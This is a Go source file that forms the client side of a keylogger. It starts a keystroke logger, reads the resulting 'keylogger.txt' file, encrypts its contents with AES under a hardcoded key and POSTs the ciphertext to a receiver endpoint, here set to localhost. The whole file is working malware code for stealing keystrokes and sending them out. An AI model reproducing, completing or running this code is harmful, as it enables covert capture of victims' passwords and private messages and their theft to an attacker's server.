package client

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"net/http"
	"os"
)

func encrypt(data []byte, key string) ([]byte, error) {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	mode := cipher.NewCFBEncrypter(block, iv)
	mode.XORKeyStream(ciphertext[aes.BlockSize:], data)

	return ciphertext, nil
}

func sendToServer(data []byte) error {
	url := "http://localhost:4200/api/receiver"
	resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP request failed with status code: %d", resp.StatusCode)
	}

	fmt.Println("Data sent to the server successfully.")
	return nil
}

func StartHttpClient() {
	// Create channel to read data into
	fileSent := make(chan struct{})

	// Start the logger in the background
	go func() {
		// Create logs and save to a file
		fmt.Println("Keylogger has been started.")
		KeyLogger()
		// Once the logs are created, signal that the file is ready to be sent
		fileSent <- struct{}{}
	}()

	// Wait for the signal to send the file
	<-fileSent

	// Read the log file
	logData, err := os.ReadFile("keylogger.txt")
	if err != nil {
		fmt.Println("Error reading the keylog file:", err)
		return
	}

	// Encrypt the log data
	encryptedData, err := encrypt(logData, "atsutczXRIS4svZH")
	if err != nil {
		fmt.Println("Error encrypting the data:", err)
		return
	}

	fmt.Println(encryptedData)

	// Send the encrypted data to the HTTP server
	err = sendToServer(encryptedData)
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
		return
	}
}
